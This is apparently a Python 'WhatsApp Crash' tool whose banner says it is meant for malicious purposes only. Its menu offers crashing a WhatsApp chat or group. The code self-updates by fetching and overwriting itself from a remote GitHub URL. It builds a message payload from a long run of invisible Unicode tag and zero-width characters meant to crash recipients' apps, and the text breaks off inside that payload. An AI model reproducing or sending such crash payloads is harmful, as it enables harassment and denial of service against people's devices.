import os
import time as t
import urllib.parse
try:
    import urllib.request
except:
    os.system("pip install --upgrade pip")
    os.system("pip install urllib2")
try:
    import pyfiglet
except:
    print("Pyfiglet isn't installed 🙁")
    t.sleep(3)
    os.system("pip install --upgrade pip")
    os.system("pip install pyfiglet")

try:
    import update_check
except:
    os.system("pip install --upgrade pip")
    os.system("pip install update-check")
try:
    import colorama
except:
    os.system("pip install --upgrade pip")
    os.system ("pip install colorama")
from colorama import *
colorama.init(autoreset=True)
os.system("clear")
print(Fore.RED + "WhatsApp Crash: This tool is meant for malicious purposely only☠️☠️💀\n\nLet\'s act and stay wicked 😠😠😡🤬\n\nWe don\'t forgive and forget 😈😈\n\nLet us crash WhatsApp 😠😡😡😡\n\nNote:This version is too powerful, it might also crash attackers whatsapp\n\nRecommendation: Use Laptop for attack")
t.sleep(4)

from update_check import isUpToDate, update
if isUpToDate(__file__,  "https://raw.githubusercontent.com/spider863644/WhatsApp-Crash/main/crash.py") == False:
    print(Fore.YELLOW+ "This version is outdated, will update the tool in a minute")
    t.sleep(3)
    update("crash.py",  "https://raw.githubusercontent.com/spider863644/WhatsApp-Crash/main/crash.py")
    print(Fore.GREEN + "Updated\nRun tool again")
    exit()
    
 
def loop():
    os.system("clear")
    head = pyfiglet.figlet_format("WhatsApp Crash")
    print(Fore.RED + head)
    print(Fore.YELLOW + "Version 1.6".center(70))
    print(Fore.CYAN + "\nThis tool was created by Spider Anongreyhat\n\nFind me on WhatsApp:+2349052863644👨‍💻👨‍💻\n\n\n")
    print(Fore.GREEN + "😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😈😈😈😈😈😈Wickedness Only😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😈😈😈😈😈😡☠️\n\n"
    )
    print(Fore.CYAN + """
[1] Crash WhatsApp
[2] Crash WhatsApp Group
[3] Join my telegram channel
[4] Join our WhatsApp group
[5] Exit Program
[6] Check Version
    """)
    try:
        menu = int(input(Fore.GREEN + "Enter an option: "))
    except ValueError:
        print(Fore.RED + "Only integer is allowed")
        t.sleep(3)
        loop()
    if menu == 1:
        header = input(Fore.YELLOW + "Enter message header: ")
        if len(header) > 10000000000:
            print(Fore.RED + "Header shouldn\'t be greater than 1000000000 characters[Space included]")
            t.sleep(3)
            loop()
        crash = {'text' : header + """
        
󠀺󠀸󠀸󠀰󠀴󠀶󠀱󠀱󠀱󠀡󠀡󠀢󠀣󠀦󠀧󠀧󠀤󠀤󠀣󠀣󠀨󠀨󠀩󠀪󠀫󠀬󠀮󠀮󠀯󠀯󠀷󠀷󠀿󠀭󠀶󠀼󠀻󠀹󠀹󠀸󠀸󠁂󠀰󠀱󠀲󠀴󠀴󠀴󠀷󠀷󠁍󠁉󠁉󠁓󠁍󠁎󠁎󠁠󠁠󠁛󠁛󠁕󠁞󠁞󠁟󠁟󠁔󠁔󠁔󠁛󠁋󠁋󠁈󠁈󠁈󠁈󠁈󠁂󠁂󠁈󠁈󠁈󠁉󠁌󠁉󠁉󠁊󠁊󠁎󠁎󠁎󠁘󠁘󠁓󠁅󠁅󠁅󠁀󠁀󠁉󠁉󠁉󠁉󠀳󠀳󠀸󠀷󠀸󠀸󠁔󠁊󠁊󠁊󠁊󠁊󠁄󠁓󠁓󠁓󠁗󠁗󠁗󠁗󠁗󠀬󠀬󠀦󠀦󠀦󠀡󠀣󠀣󠀣󠀣󠀣󠁐󠁐󠁐󠁐󠁐󠁐󠁜󠁜󠁜󠁜󠁝󠁝󠁝󠁝󠁘󠁠󠁠󠁡󠁡󠁐󠁈󠁈󠀺󠀸󠀸󠀰󠀴󠀶󠀱󠀱󠀱󠀡󠀡󠀢󠀣󠀦󠀧󠀧󠀤󠀤󠀣󠀣󠀨󠀨󠀩󠀪󠀫󠀬󠀮󠀮󠀯󠀯󠀷󠀷󠀿󠀭󠀶󠀼󠀻󠀹󠀹󠀸󠀸󠁂󠀰󠀱󠀲󠀴󠀴󠀴󠀷󠀷󠁍󠁉󠁉󠁓󠁍󠁎󠁎󠁠󠁠󠁛󠁛󠁕󠁞󠁞󠁟󠁟󠁔󠁔󠁔󠁛󠁋󠁋󠁈󠁈󠁈󠁈󠁈󠁂󠁂󠁈󠁈󠁈󠁉󠁌󠁉󠁉󠁊󠁊󠁎󠁎󠁎󠁘󠁘󠁓󠁅󠁅󠁅󠁀󠁀󠁉󠁉󠁉󠁉󠀳󠀳󠀸󠀷󠀸󠀸󠁔󠁊󠁊󠁊󠁊󠁊󠁄󠁓󠁓󠁓󠁗󠁗󠁗󠁗󠁗󠀬󠀬󠀦󠀦󠀦󠀡󠀣󠀣󠀣󠀣󠀣󠀬󠀷󠀷󠀷󠁀󠁓󠁗󠀸󠁔󠁅󠁔󠁔󠁎󠁘󠁀󠁀󠁔󠁔󠁔󠁈󠁈󠀸󠀷󠀷󠀷󠀱󠀱󠀱󠀱󠀱󠀹󠀶󠀲󠀶󠀿󠀪󠀭󠀮󠀮󠀼󠀿󠀼󠀼󠁔󠀳󠁔󠀬󠀷󠀷󠀷󠁀󠁓󠁗󠀸󠁔󠁅󠁔󠁔󠁎󠁘󠁀󠁀󠁔󠁔󠁔󠁈󠁈󠀸󠀷󠀷󠀷󠀱󠀱󠀱󠀱󠀱󠀹󠀶󠀲󠀶󠀿󠀪󠀭󠀮󠀮󠀼󠀿󠀼󠀼󠁔󠀳󠁔󠀬󠀷󠀷󠀷󠁀󠁓󠁗󠀸󠁔󠁅󠁔󠁔󠁎󠁘󠁀󠁀󠁔󠁔󠁔󠁈󠁈󠀸󠀷󠀷󠀷󠀱󠀱󠀱󠀱󠀱󠀹󠀶󠀲󠀶󠀿󠀪󠀭󠀮󠀮󠀼󠀿󠀼󠀼󠁔󠀳󠁔󠀬󠀷󠀷󠀷󠁀󠁓󠁗󠀸󠁔󠁅󠁔󠁔󠁎󠁘󠁀󠁀󠁔󠁔󠁔󠁈󠁈󠀸󠀷󠀷󠀷󠀱󠀱󠀱󠀱󠀱󠀹󠀶󠀲󠀶󠀿󠀪󠀭󠀮󠀮󠀼󠀿󠀼󠀼󠁔󠀳󠁔󠀬󠀷󠀷󠀷󠁀󠁓󠁗󠀸󠁔󠁅󠁔󠁔󠁎󠁘󠁀󠁀󠁔󠁔󠁔󠁈󠁈󠀸󠀷󠀷󠀷󠀱󠀱󠀱󠀱󠀱󠀹󠀶󠀲󠀶󠀿󠀪󠀭󠀮󠀮󠀼󠀿󠀼󠀼󠁔‎‏​‌‌󠁐󠁐󠁐󠁐󠁐󠁐󠁜󠁜󠁜󠁜󠁝󠁝󠁝󠁝󠁘󠁠󠁠󠁡󠁡󠁐󠁈󠁈󠀺󠀸󠀸󠀰󠀴󠀶󠀱󠀱󠀱󠀡󠀡󠀢󠀣󠀦󠀧󠀧󠀤󠀤󠀣󠀣󠀨󠀨󠀩󠀪󠀫󠀬󠀮󠀮󠀯󠀯󠀷󠀷󠀿󠀭󠀶󠀼󠀻󠀹󠀹󠀸󠀸󠁂󠀰󠀱󠀲󠀴󠀴󠀴󠀷󠀷󠁍󠁉󠁉󠁓󠁍󠁎󠁎󠁠󠁠󠁛󠁛󠁕󠁞󠁞󠁟󠁟󠁔󠁔󠁔󠁛󠁋󠁋󠁈󠁈󠁈󠁈󠁈󠁂󠁂󠁈󠁈󠁈󠁉󠁌󠁉󠁉󠁊󠁊󠁎󠁎󠁎󠁘󠁘󠁓󠁅󠁅󠁅󠁀󠁀󠁉󠁉󠁉󠁉󠀳󠀳󠀸󠀷󠀸󠀸󠁔󠁊󠁊󠁊󠁊󠁊󠁄󠁓󠁓󠁓󠁗󠁗󠁗󠁗󠁗󠀬󠀬󠀦󠀦󠀦󠀡󠀣󠀣󠀣󠀣󠀣󠁐󠁐󠁐󠁐󠁐󠁐󠁜󠁜󠁜󠁜󠁝󠁝󠁝󠁝󠁘󠁠󠁠󠁡󠁡󠁐󠁈󠁈󠀺󠀸󠀸󠀰󠀴󠀶󠀱󠀱󠀱󠀡󠀡󠀢󠀣󠀦󠀧󠀧󠀤󠀤󠀣󠀣󠀨󠀨󠀩󠀪󠀫󠀬󠀮󠀮󠀯󠀯󠀷󠀷󠀿󠀭󠀶󠀼󠀻󠀹󠀹󠀸󠀸󠁂󠀰󠀱󠀲󠀴󠀴󠀴󠀷󠀷󠁍󠁉󠁉󠁓󠁍󠁎󠁎󠁠󠁠󠁛󠁛󠁕󠁞󠁞󠁟󠁟󠁔󠁔󠁔󠁛󠁋󠁋󠁈󠁈󠁈󠁈󠁈󠁂󠁂󠁈󠁈󠁈󠁉󠁌󠁉󠁉󠁊󠁊󠁎󠁎󠁎󠁘󠁘󠁓󠁅󠁅󠁅󠁀󠁀󠁉󠁉󠁉󠁉󠀳󠀳󠀸󠀷󠀸󠀸󠁔󠁊󠁊󠁊󠁊󠁊󠁄󠁓󠁓󠁓󠁗󠁗󠁗󠁗󠁗󠀬󠀬󠀦󠀦󠀦󠀡󠀣󠀣󠀣󠀣󠀣󠁐󠁐󠁐󠁐󠁐󠁐󠁜󠁜󠁜󠁜󠁝󠁝󠁝󠁝󠁘󠁠󠁠󠁡󠁡󠁐󠁈󠁈󠀺󠀸󠀸󠀰󠀴󠀶󠀱󠀱󠀱󠀡󠀡󠀢󠀣󠀦󠀧󠀧󠀤󠀤󠀣󠀣󠀨󠀨󠀩󠀪󠀫󠀬󠀮󠀮󠀯󠀯󠀷󠀷󠀿󠀭󠀶󠀼󠀻󠀹󠀹󠀸󠀸󠁂󠀰󠀱󠀲󠀴󠀴󠀴󠀷󠀷󠁍󠁉󠁉󠁓󠁍󠁎󠁎󠁠󠁠󠁛󠁛󠁕󠁞󠁞󠁟󠁟󠁔󠁔󠁔󠁛󠁋󠁋󠁈󠁈󠁈󠁈󠁈󠁂󠁂󠁈󠁈󠁈󠁉󠁌󠁉󠁉󠁊󠁊󠁎󠁎󠁎󠁘󠁘󠁓󠁅󠁅󠁅󠁀󠁀󠁉󠁉󠁉󠁉󠀳󠀳󠀸󠀷󠀸󠀸󠁔󠁊󠁊󠁊󠁊󠁊󠁄󠁓󠁓󠁓󠁗󠁗󠁗󠁗󠁗󠀬󠀬󠀦󠀦󠀦󠀡󠀣󠀣󠀣󠀣󠀣󠁐󠁐󠁐󠁐󠁐󠁐󠁜󠁜󠁜󠁜󠁝󠁝󠁝󠁝󠁘󠁠󠁠󠁡󠁡󠁐󠁈󠁈󠀺󠀸󠀸󠀰󠀴󠀶󠀱󠀱󠀱󠀡󠀡󠀢󠀣󠀦󠀧󠀧󠀤󠀤󠀣󠀣󠀨󠀨󠀩󠀪󠀫󠀬󠀮󠀮󠀯󠀯󠀷󠀷󠀿󠀭󠀶󠀼󠀻󠀹󠀹󠀸󠀸󠁂󠀰󠀱󠀲󠀴󠀴󠀴󠀷󠀷󠁍󠁉󠁉󠁓󠁍󠁎󠁎󠁠󠁠󠁛󠁛󠁕󠁞󠁞󠁟󠁟󠁔󠁔󠁔󠁛󠁋󠁋󠁈󠁈󠁈󠁈󠁈󠁂󠁂󠁈󠁈󠁈󠁉󠁌󠁉󠁉󠁊󠁊󠁎󠁎󠁎󠁘󠁘󠁓󠁅󠁅󠁅󠁀󠁀󠁉󠁉󠁉󠁉󠀳󠀳󠀸󠀷󠀸󠀸󠁔󠁊󠁊󠁊󠁊󠁊󠁄󠁓󠁓󠁓󠁗󠁗󠁗󠁗󠁗󠀬󠀬󠀦󠀦󠀦󠀡󠀣󠀣󠀣󠀣󠀣󠁐󠁐󠁐󠁐󠁐󠁐󠁜󠁜󠁜󠁜󠁝󠁝󠁝󠁝󠁘󠁠󠁠󠁡󠁡󠁐󠁈󠁈󠀺󠀸󠀸󠀰󠀴󠀶󠀱󠀱󠀱󠀡󠀡󠀢󠀣󠀦󠀧󠀧󠀤󠀤󠀣󠀣󠀨󠀨󠀩󠀪󠀫󠀬󠀮󠀮󠀯󠀯󠀷󠀷󠀿󠀭󠀶󠀼󠀻󠀹󠀹󠀸󠀸󠁂󠀰󠀱󠀲󠀴󠀴󠀴󠀷󠀷󠁍󠁉󠁉󠁓󠁍󠁎󠁎󠁠󠁠󠁛󠁛󠁕󠁞󠁞󠁟󠁟󠁔󠁔󠁔󠁛󠁋󠁋󠁈󠁈󠁈󠁈󠁈󠁂󠁂󠁈󠁈󠁈󠁉󠁌󠁉󠁉󠁊󠁊󠁎󠁎󠁎󠁘󠁘󠁓󠁅󠁅󠁅󠁀󠁀󠁉󠁉󠁉󠁉󠀳󠀳󠀸󠀷󠀸󠀸󠁔󠁊󠁊󠁊󠁊󠁊󠁄󠁓󠁓󠁓󠁗󠁗󠁗󠁗󠁗󠀬󠀬󠀦󠀦󠀦󠀡󠀣󠀣󠀣󠀣󠀣󠁐󠁐󠁐󠁐󠁐󠁐󠁜󠁜󠁜󠁜󠁝󠁝󠁝󠁝󠁘󠁠󠁠󠁡󠁡󠁐󠁈󠁈󠀺󠀸󠀸󠀰󠀴󠀶󠀱󠀱󠀱󠀡󠀡󠀢󠀣󠀦󠀧󠀧󠀤󠀤󠀣󠀣󠀨󠀨󠀩󠀪󠀫󠀬󠀮󠀮󠀯󠀯󠀷󠀷󠀿󠀭󠀶󠀼󠀻󠀹󠀹󠀸󠀸󠁂󠀰󠀱󠀲󠀴󠀴󠀴󠀷󠀷󠁍󠁉󠁉󠁓󠁍󠁎󠁎󠁠󠁠󠁛󠁛󠁕󠁞󠁞󠁟󠁟󠁔󠁔󠁔󠁛󠁋󠁋󠁈󠁈󠁈󠁈󠁈󠁂󠁂󠁈󠁈󠁈󠁉󠁌󠁉󠁉󠁊󠁊󠁎󠁎󠁎󠁘󠁘󠁓󠁅󠁅󠁅󠁀󠁀󠁉󠁉󠁉󠁉󠀳󠀳󠀸󠀷󠀸󠀸󠁔󠁊󠁊󠁊󠁊󠁊󠁄󠁓󠁓󠁓󠁗󠁗󠁗󠁗󠁗󠀬󠀬󠀦󠀦󠀦󠀡󠀣󠀣󠀣󠀣󠀣󠁐󠁐󠁐󠁐󠁐󠁐󠁜󠁜󠁜󠁜󠁝󠁝󠁝󠁝󠁘󠁠󠁠󠁡󠁡󠁐󠁈󠁈󠀺󠀸󠀸󠀰󠀴󠀶󠀱󠀱󠀱󠀡󠀡󠀢󠀣󠀦󠀧󠀧󠀤󠀤󠀣󠀣󠀨󠀨󠀩󠀪󠀫󠀬󠀮󠀮󠀯󠀯󠀷󠀷󠀿󠀭󠀶󠀼󠀻󠀹󠀹󠀸󠀸󠁂󠀰󠀱󠀲󠀴󠀴󠀴󠀷󠀷󠁍󠁉󠁉󠁓󠁍󠁎󠁎󠁠󠁠󠁛󠁛󠁕󠁞󠁞󠁟󠁟󠁔󠁔󠁔󠁛󠁋󠁋󠁈󠁈󠁈󠁈󠁈󠁂󠁂󠁈󠁈󠁈󠁉󠁌󠁉󠁉󠁊󠁊󠁎󠁎󠁎󠁘󠁘󠁓󠁅󠁅󠁅󠁀󠁀󠁉󠁉󠁉󠁉󠀳󠀳󠀸󠀷󠀸󠀸󠁔󠁊󠁊󠁊󠁊󠁊󠁄󠁓󠁓󠁓󠁗󠁗󠁗󠁗󠁗󠀬󠀬󠀦󠀦󠀦󠀡󠀣󠀣󠀣󠀣󠀣󠁐󠁐󠁐󠁐󠁐󠁐󠁜󠁜󠁜󠁜󠁝󠁝󠁝󠁝󠁘󠁠󠁠󠁡󠁡󠁐󠁈󠁈󠀺󠀸󠀸󠀰󠀴󠀶󠀱󠀱󠀱󠀡󠀡󠀢󠀣󠀦󠀧󠀧󠀤󠀤󠀣󠀣󠀨󠀨󠀩󠀪󠀫󠀬󠀮󠀮󠀯󠀯󠀷󠀷󠀿󠀭󠀶󠀼󠀻󠀹󠀹󠀸󠀸󠁂󠀰󠀱󠀲󠀴󠀴󠀴󠀷󠀷󠁍󠁉󠁉󠁓󠁍󠁎󠁎󠁠󠁠󠁛󠁛󠁕󠁞󠁞󠁟󠁟󠁔󠁔󠁔󠁛󠁋󠁋󠁈󠁈󠁈󠁈󠁈󠁂󠁂󠁈󠁈󠁈󠁉󠁌󠁉󠁉󠁊󠁊󠁎󠁎󠁎󠁘󠁘󠁓󠁅󠁅󠁅󠁀󠁀󠁉󠁉󠁉󠁉󠀳󠀳󠀸󠀷󠀸󠀸󠁔󠁊󠁊󠁊󠁊󠁊󠁄󠁓󠁓󠁓󠁗󠁗󠁗󠁗󠁗󠀬󠀬󠀦󠀦󠀦󠀡󠀣󠀣󠀣󠀣󠀣󠁐󠁐󠁐󠁐󠁐󠁐󠁜󠁜󠁜󠁜󠁝󠁝󠁝󠁝󠁘󠁠󠁠󠁡󠁡󠁐󠁈󠁈󠀺󠀸󠀸󠀰󠀴󠀶󠀱󠀱󠀱󠀡󠀡󠀢󠀣󠀦󠀧󠀧󠀤󠀤󠀣󠀣󠀨󠀨󠀩󠀪󠀫󠀬󠀮󠀮󠀯󠀯󠀷󠀷󠀿󠀭󠀶󠀼󠀻󠀹󠀹󠀸󠀸󠁂󠀰󠀱󠀲󠀴󠀴󠀴󠀷󠀷󠁍󠁉󠁉󠁓󠁍󠁎󠁎󠁠󠁠󠁛󠁛󠁕󠁞󠁞󠁟󠁟󠁔󠁔󠁔󠁛󠁋󠁋󠁈󠁈󠁈󠁈󠁈󠁂󠁂󠁈󠁈󠁈󠁉󠁌󠁉󠁉󠁊󠁊󠁎󠁎󠁎󠁘󠁘󠁓󠁅󠁅󠁅󠁀󠁀󠁉󠁉󠁉󠁉󠀳󠀳󠀸󠀷󠀸󠀸󠁔󠁊󠁊󠁊󠁊󠁊󠁄󠁓󠁓󠁓󠁗󠁗󠁗󠁗󠁗󠀬󠀬󠀦󠀦󠀦󠀡󠀣󠀣󠀣󠀣󠀣󠁐󠁐󠁐󠁐󠁐󠁐󠁜󠁜󠁜󠁜󠁝󠁝󠁝󠁝󠁘󠁠󠁠󠁡󠁡󠁐󠁈󠁈󠀺󠀸󠀸󠀰󠀴󠀶󠀱󠀱󠀱󠀡󠀡󠀢󠀣󠀦󠀧󠀧󠀤󠀤󠀣󠀣󠀨󠀨󠀩󠀪󠀫󠀬󠀮󠀮󠀯󠀯󠀷󠀷󠀿󠀭󠀶󠀼󠀻󠀹󠀹󠀸󠀸󠁂󠀰󠀱󠀲󠀴󠀴󠀴󠀷󠀷󠁍󠁉󠁉󠁓󠁍󠁎󠁎󠁠󠁠󠁛󠁛󠁕󠁞󠁞󠁟󠁟󠁔󠁔󠁔󠁛󠁋󠁋󠁈󠁈󠁈󠁈󠁈󠁂󠁂󠁈󠁈󠁈󠁉󠁌󠁉󠁉󠁊󠁊󠁎󠁎󠁎󠁘󠁘󠁓󠁅󠁅󠁅󠁀󠁀󠁉󠁉󠁉󠁉󠀳󠀳󠀸󠀷󠀸󠀸󠁔󠁊󠁊󠁊󠁊󠁊󠁄󠁓󠁓󠁓󠁗󠁗󠁗󠁗󠁗󠀬󠀬󠀦󠀦󠀦󠀡󠀣󠀣󠀣󠀣󠀣󠁐󠁐󠁐󠁐󠁐󠁐󠁜󠁜󠁜󠁜󠁝󠁝󠁝󠁝󠁘󠁠󠁠󠁡󠁡󠁐󠁈󠁈󠀺󠀸󠀸󠀰󠀴󠀶󠀱󠀱󠀱󠀡󠀡󠀢󠀣󠀦󠀧󠀧󠀤󠀤󠀣󠀣󠀨󠀨󠀩󠀪󠀫󠀬󠀮󠀮󠀯󠀯󠀷󠀷󠀿󠀭󠀶󠀼󠀻󠀹󠀹󠀸󠀸󠁂󠀰󠀱󠀲󠀴󠀴󠀴󠀷󠀷󠁍󠁉󠁉󠁓󠁍󠁎󠁎󠁠󠁠󠁛󠁛󠁕󠁞󠁞󠁟󠁟󠁔󠁔󠁔󠁛󠁋󠁋󠁈󠁈󠁈󠁈󠁈󠁂󠁂󠁈󠁈󠁈󠁉󠁌󠁉󠁉󠁊󠁊󠁎󠁎󠁎󠁘󠁘󠁓󠁅󠁅󠁅󠁀󠁀󠁉󠁉󠁉󠁉󠀳󠀳󠀸󠀷󠀸󠀸󠁔󠁊󠁊󠁊󠁊󠁊󠁄󠁓󠁓󠁓󠁗󠁗󠁗󠁗󠁗󠀬󠀬󠀦󠀦󠀦󠀡󠀣󠀣󠀣󠀣󠀣󠁐󠁐󠁐󠁐󠁐󠁐󠁜󠁜󠁜󠁜󠁝󠁝󠁝󠁝󠁘󠁠󠁠󠁡󠁡󠁐󠁈󠁈󠀺󠀸󠀸󠀰󠀴󠀶󠀱󠀱󠀱󠀡󠀡󠀢󠀣󠀦󠀧󠀧󠀤󠀤󠀣󠀣󠀨󠀨󠀩󠀪󠀫󠀬󠀮󠀮󠀯󠀯󠀷󠀷󠀿󠀭󠀶󠀼󠀻󠀹󠀹󠀸󠀸󠁂󠀰󠀱󠀲󠀴󠀴󠀴󠀷󠀷󠁍󠁉󠁉󠁓󠁍󠁎󠁎󠁠󠁠󠁛󠁛󠁕󠁞󠁞󠁟󠁟󠁔󠁔󠁔󠁛󠁋󠁋󠁈󠁈󠁈󠁈󠁈󠁂󠁂󠁈󠁈󠁈󠁉󠁌󠁉󠁉󠁊󠁊󠁎󠁎󠁎󠁘󠁘󠁓󠁅󠁅󠁅󠁀󠁀󠁉󠁉󠁉󠁉󠀳󠀳󠀸󠀷󠀸󠀸󠁔󠁊󠁊󠁊󠁊󠁊󠁄󠁓󠁓󠁓󠁗󠁗󠁗󠁗󠁗󠀬󠀬󠀦󠀦󠀦󠀡󠀣󠀣󠀣󠀣󠀣󠁐󠁐󠁐󠁐󠁐󠁐󠁜󠁜󠁜󠁜󠁝󠁝󠁝󠁝󠁘󠁠󠁠󠁡󠁡󠁐󠁈󠁈󠀺󠀸󠀸󠀰󠀴󠀶󠀱󠀱󠀱󠀡󠀡󠀢󠀣󠀦󠀧󠀧󠀤󠀤󠀣󠀣󠀨󠀨󠀩󠀪󠀫󠀬󠀮󠀮󠀯󠀯󠀷󠀷󠀿󠀭󠀶󠀼󠀻󠀹󠀹󠀸󠀸󠁂󠀰󠀱󠀲󠀴󠀴󠀴󠀷󠀷󠁍󠁉󠁉󠁓󠁍󠁎󠁎󠁠󠁠󠁛󠁛󠁕󠁞󠁞󠁟󠁟󠁔󠁔󠁔󠁛󠁋󠁋󠁈󠁈󠁈󠁈󠁈󠁂󠁂󠁈󠁈󠁈󠁉󠁌󠁉󠁉󠁊󠁊󠁎󠁎󠁎󠁘󠁘󠁓󠁅󠁅󠁅󠁀󠁀󠁉󠁉󠁉󠁉󠀳󠀳󠀸󠀷󠀸󠀸󠁔󠁊󠁊󠁊󠁊󠁊󠁄󠁓󠁓󠁓󠁗󠁗󠁗󠁗󠁗󠀬󠀬󠀦󠀦󠀦󠀡󠀣󠀣󠀣󠀣󠀣󠁐󠁐󠁐󠁐󠁐󠁐󠁜󠁜󠁜󠁜󠁝󠁝󠁝󠁝󠁘󠁠󠁠󠁡󠁡󠁐󠁈󠁈󠀺󠀸󠀸󠀰󠀴󠀶󠀱󠀱󠀱󠀡󠀡󠀢󠀣󠀦󠀧󠀧󠀤󠀤󠀣󠀣󠀨󠀨󠀩󠀪󠀫󠀬󠀮󠀮󠀯󠀯󠀷󠀷󠀿󠀭󠀶󠀼󠀻󠀹󠀹󠀸󠀸󠁂󠀰󠀱󠀲󠀴󠀴󠀴󠀷󠀷󠁍󠁉󠁉󠁓󠁍󠁎󠁎󠁠󠁠󠁛󠁛󠁕󠁞󠁞󠁟󠁟󠁔󠁔󠁔󠁛󠁋󠁋󠁈󠁈󠁈󠁈󠁈󠁂󠁂󠁈󠁈󠁈󠁉󠁌󠁉󠁉󠁊󠁊󠁎󠁎󠁎󠁘󠁘󠁓󠁅󠁅󠁅󠁀󠁀󠁉󠁉󠁉󠁉󠀳󠀳󠀸󠀷󠀸󠀸󠁔󠁊󠁊󠁊󠁊󠁊󠁄󠁓󠁓󠁓󠁗󠁗󠁗󠁗󠁗󠀬󠀬󠀦󠀦󠀦󠀡󠀣󠀣󠀣󠀣󠀣󠁐󠁐󠁐󠁐󠁐󠁐󠁜󠁜󠁜󠁜󠁝󠁝󠁝󠁝󠁘󠁠󠁠󠁡󠁡󠁐󠁈󠁈󠀺󠀸󠀸󠀰󠀴󠀶󠀱󠀱󠀱󠀡󠀡󠀢󠀣󠀦󠀧󠀧󠀤󠀤󠀣󠀣󠀨󠀨󠀩󠀪󠀫󠀬󠀮󠀮󠀯󠀯󠀷󠀷󠀿󠀭󠀶󠀼󠀻󠀹󠀹󠀸󠀸󠁂󠀰󠀱󠀲󠀴󠀴󠀴󠀷󠀷󠁍󠁉󠁉󠁓󠁍󠁎󠁎󠁠󠁠󠁛󠁛󠁕󠁞󠁞󠁟󠁟󠁔󠁔󠁔󠁛󠁋󠁋󠁈󠁈󠁈󠁈󠁈󠁂󠁂󠁈󠁈󠁈󠁉󠁌󠁉󠁉󠁊󠁊󠁎󠁎󠁎󠁘󠁘󠁓󠁅󠁅󠁅󠁀󠁀󠁉󠁉󠁉󠁉󠀳󠀳󠀸󠀷󠀸󠀸󠁔󠁊󠁊󠁊󠁊󠁊󠁄󠁓󠁓󠁓󠁗󠁗󠁗󠁗󠁗󠀬󠀬󠀦󠀦󠀦󠀡󠀣󠀣󠀣󠀣󠀣󠁐󠁐󠁐󠁐󠁐󠁐󠁜󠁜󠁜󠁜󠁝󠁝󠁝󠁝󠁘󠁠󠁠󠁡󠁡󠁐󠁈󠁈󠀺󠀸󠀸󠀰󠀴󠀶󠀱󠀱󠀱󠀡󠀡󠀢󠀣󠀦󠀧󠀧󠀤󠀤󠀣󠀣󠀨󠀨󠀩󠀪󠀫󠀬󠀮󠀮󠀯󠀯󠀷󠀷󠀿󠀭󠀶󠀼󠀻󠀹󠀹󠀸󠀸󠁂󠀰󠀱󠀲󠀴󠀴󠀴󠀷󠀷󠁍󠁉󠁉󠁓󠁍󠁎󠁎󠁠󠁠󠁛󠁛󠁕󠁞󠁞󠁟󠁟󠁔󠁔󠁔󠁛󠁋󠁋󠁈󠁈󠁈󠁈󠁈󠁂󠁂󠁈󠁈󠁈󠁉󠁌󠁉󠁉󠁊󠁊󠁎󠁎󠁎󠁘󠁘󠁓󠁅󠁅󠁅󠁀󠁀󠁉󠁉󠁉󠁉󠀳󠀳󠀸󠀷󠀸󠀸󠁔󠁊󠁊󠁊󠁊󠁊󠁄󠁓󠁓󠁓󠁗󠁗󠁗󠁗󠁗󠀬󠀬󠀦󠀦󠀦󠀡󠀣󠀣󠀣󠀣󠀣󠁐󠁐󠁐󠁐󠁐󠁐󠁜󠁜󠁜󠁜󠁝󠁝󠁝󠁝󠁘󠁠󠁠󠁡󠁡󠁐󠁈󠁈󠀺󠀸󠀸󠀰󠀴󠀶󠀱󠀱󠀱󠀡󠀡󠀢󠀣󠀦󠀧󠀧󠀤󠀤󠀣󠀣󠀨󠀨󠀩󠀪󠀫󠀬󠀮󠀮󠀯󠀯󠀷󠀷󠀿󠀭󠀶󠀼󠀻󠀹󠀹󠀸󠀸󠁂󠀰󠀱󠀲󠀴󠀴󠀴󠀷󠀷󠁍󠁉󠁉󠁓󠁍󠁎󠁎󠁠󠁠󠁛󠁛󠁕󠁞󠁞󠁟󠁟󠁔󠁔󠁔󠁛󠁋󠁋󠁈󠁈󠁈󠁈󠁈󠁂󠁂󠁈󠁈󠁈󠁉󠁌󠁉󠁉󠁊󠁊󠁎󠁎󠁎󠁘󠁘󠁓󠁅󠁅󠁅󠁀󠁀󠁉󠁉󠁉󠁉󠀳󠀳󠀸󠀷󠀸󠀸󠁔󠁊󠁊󠁊󠁊󠁊󠁄󠁓󠁓󠁓󠁗󠁗󠁗󠁗󠁗󠀬󠀬󠀦󠀦󠀦󠀡󠀣󠀣󠀣󠀣󠀣󠁐󠁐󠁐󠁐󠁐󠁐󠁜󠁜󠁜󠁜󠁝󠁝󠁝󠁝󠁘󠁠󠁠󠁡󠁡󠁐󠁈󠁈󠀺󠀸󠀸󠀰󠀴󠀶󠀱󠀱󠀱󠀡󠀡󠀢󠀣󠀦󠀧󠀧󠀤󠀤󠀣󠀣󠀨󠀨󠀩󠀪󠀫󠀬󠀮󠀮󠀯󠀯󠀷󠀷󠀿󠀭󠀶󠀼󠀻󠀹󠀹󠀸󠀸󠁂󠀰󠀱󠀲󠀴󠀴󠀴󠀷󠀷󠁍󠁉󠁉󠁓󠁍󠁎󠁎󠁠󠁠󠁛󠁛󠁕󠁞󠁞󠁟󠁟󠁔󠁔󠁔󠁛󠁋󠁋󠁈󠁈󠁈󠁈󠁈󠁂󠁂󠁈󠁈󠁈󠁉󠁌󠁉󠁉󠁊󠁊󠁎󠁎󠁎󠁘󠁘󠁓󠁅󠁅󠁅󠁀󠁀󠁉󠁉󠁉󠁉󠀳󠀳󠀸󠀷󠀸󠀸󠁔󠁊󠁊󠁊󠁊󠁊󠁄󠁓󠁓󠁓󠁗󠁗󠁗󠁗󠁗󠀬󠀬󠀦󠀦󠀦󠀡󠀣󠀣󠀣󠀣󠀣󠁐󠁐󠁐󠁐󠁐󠁐󠁜󠁜󠁜󠁜󠁝󠁝󠁝󠁝󠁘󠁠󠁠󠁡󠁡󠁐󠁈󠁈󠀺󠀸󠀸󠀰󠀴󠀶󠀱󠀱󠀱󠀡󠀡󠀢󠀣󠀦󠀧󠀧󠀤󠀤󠀣󠀣󠀨󠀨󠀩󠀪󠀫󠀬󠀮󠀮󠀯󠀯󠀷󠀷󠀿󠀭󠀶󠀼󠀻󠀹󠀹󠀸󠀸󠁂󠀰󠀱󠀲󠀴󠀴󠀴󠀷󠀷󠁍󠁉󠁉󠁓󠁍󠁎󠁎󠁠󠁠󠁛󠁛󠁕󠁞󠁞󠁟󠁟󠁔󠁔󠁔󠁛󠁋󠁋󠁈󠁈󠁈󠁈󠁈󠁂󠁂󠁈󠁈󠁈󠁉󠁌